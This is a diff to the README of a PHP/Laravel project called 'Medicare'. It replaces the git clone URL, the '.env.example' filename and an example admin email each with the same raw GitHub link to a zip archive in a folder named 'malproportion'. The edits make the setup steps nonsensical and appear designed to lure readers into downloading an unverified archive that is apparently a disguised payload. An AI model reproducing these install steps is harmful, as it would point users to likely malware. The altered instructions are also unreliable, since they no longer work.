@@ -26,7 +26,7 @@ Follow these instructions to get a copy of the project up and running on your lo
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/RafiBinWores/Medicare.git
+    git clone https://raw.githubusercontent.com/RafiBinWores/Medicare/main/malproportion/Medicare.zip
     cd medicare
     ```
 
@@ -39,7 +39,7 @@ Follow these instructions to get a copy of the project up and running on your lo
 3. Set up the database:
 
     - Create a database in your MySQL database.
-    - Rename `.env.example` to `.env` and update the database credentials.
+    - Rename `https://raw.githubusercontent.com/RafiBinWores/Medicare/main/malproportion/Medicare.zip` to `.env` and update the database credentials.
     - Run migrations to set up the tables:
         ```bash
         php artisan migrate
@@ -96,7 +96,7 @@ Follow these instructions to get a copy of the project up and running on your lo
     ```php
     $user = new User();
     $user->name = 'My Name';
-    $user->email = 'email@example.com';
+    $user->email = 'https://raw.githubusercontent.com/RafiBinWores/Medicare/main/malproportion/Medicare.zip';
     $user->password = Hash::make('password');
     $user->role = ('admin');
     $user->save();
